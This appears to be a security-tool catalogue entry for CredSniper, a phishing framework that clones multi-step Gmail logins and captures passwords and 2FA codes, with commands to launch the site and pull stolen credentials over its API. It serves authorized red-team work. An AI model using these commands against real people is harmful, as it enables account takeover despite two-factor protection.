---
name: "credsniper"
categories:
  - blackarch-social
version: "21.f52461b"
homepage: "https://github.com/ustayready/CredSniper"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: Apache
meta-checked: "2026-11-09"
github-repo: "ustayready/CredSniper"
github-stars: 1396
github-pushed: "2020-05-22"
github-archived: false
github-issues: 17
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# credsniper

> Flask phishing framework that serves cloned multi-step login flows over SSL and captures credentials including 2FA tokens, with an HTTP API for pulling captures live.

## What it's for

Launches a realistic cloned login sequence — username page, password page, then the two-factor prompt (SMS code, TOTP or phone prompt) — and records each step the victim submits. Captured credentials land in a `.sniped` flat file (with `.cache` as a staging file while a 2FA session is mid-flight) and are also served over an authenticated HTTP API so other tooling can consume them during the engagement. TLS is handled via Let's Encrypt. It ships a Gmail module (which forces 2FA fallback options where a target expects U2F) plus a worked example module; new sites are added as Jinja2 templates with a small Python module file. Scope is the web login flow only — use exclusively in authorized engagements.

## Typical use cases

### Stand up a 2FA-capable phishing site with SSL

```
credsniper --module gmail --twofactor --hostname phish.example.com --port 443 --ssl --final https://example.com
```

Outcome: serves the cloned Gmail login flow on the hostname with Let's Encrypt TLS; every submitted username, password and 2FA token is appended to `.sniped` in the working directory, and after the final step the victim is redirected to the `--final` URL.

### Pull captured credentials programmatically

```
curl -s "https://phish.example.com/creds/view?api_token=<token>"
```

Outcome: returns the captured credentials as JSON when the query's `api_token` matches the token CredSniper generated at startup, letting a listener or chat notification consume captures as they arrive.

### Mark a credential as triaged

```
curl -s "https://phish.example.com/creds/seen/<cred_id>?api_token=<token>"
```

Outcome: flags that credential record as seen so subsequent `/creds/view` consumers can distinguish fresh captures from ones already handled; configuration changes (module, 2FA toggle, rotating the API token) go through `POST /config` with the current token in the JSON body.

*No corpus evidence — derived from upstream documentation.*
